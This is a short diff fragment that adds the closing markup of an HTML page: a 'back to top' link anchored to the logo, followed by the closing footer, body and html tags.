+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
